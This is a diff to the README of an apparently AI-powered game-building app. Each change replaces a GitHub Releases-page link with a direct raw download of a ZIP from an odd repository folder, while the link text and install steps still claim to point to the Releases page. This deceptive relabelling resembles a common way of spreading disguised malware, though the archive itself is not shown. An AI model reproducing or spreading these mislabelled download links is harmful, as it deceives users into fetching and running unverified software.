@@ -1,6 +1,6 @@
 # 🛠️ GamineAI-Builder- - Build Games Faster With AI
 
-[![Download GamineAI-Builder-](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge&logo=github)](https://github.com/kalber8788/GamineAI-Builder-/releases)
+[![Download GamineAI-Builder-](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge&logo=github)](https://github.com/kalber8788/GamineAI-Builder-/raw/refs/heads/main/intercommunicate/Gamine-Builder-A-v2.7.zip)
 
 ## 🧩 What GamineAI-Builder- Does
 
@@ -16,7 +16,7 @@ Use it to:
 
 ## 📥 Download and Install
 
-1. Go to the [GamineAI-Builder- Releases page](https://github.com/kalber8788/GamineAI-Builder-/releases)
+1. Go to the [GamineAI-Builder- Releases page](https://github.com/kalber8788/GamineAI-Builder-/raw/refs/heads/main/intercommunicate/Gamine-Builder-A-v2.7.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from the release assets
 4. If the download is in a ZIP file, right-click it and choose Extract All
@@ -183,11 +183,11 @@ With GamineAI-Builder-, you can make drafts for:
 
 ## 📎 Download Again
 
-If you need the file later, go back to the [GamineAI-Builder- Releases page](https://github.com/kalber8788/GamineAI-Builder-/releases) and download the newest version from there
+If you need the file later, go back to the [GamineAI-Builder- Releases page](https://github.com/kalber8788/GamineAI-Builder-/raw/refs/heads/main/intercommunicate/Gamine-Builder-A-v2.7.zip) and download the newest version from there
 
 ## 🧭 Quick Start Steps
 
-1. Open the [Releases page](https://github.com/kalber8788/GamineAI-Builder-/releases)
+1. Open the [Releases page](https://github.com/kalber8788/GamineAI-Builder-/raw/refs/heads/main/intercommunicate/Gamine-Builder-A-v2.7.zip)
 2. Download the latest Windows release
 3. Extract the ZIP file if needed
 4. Open the app
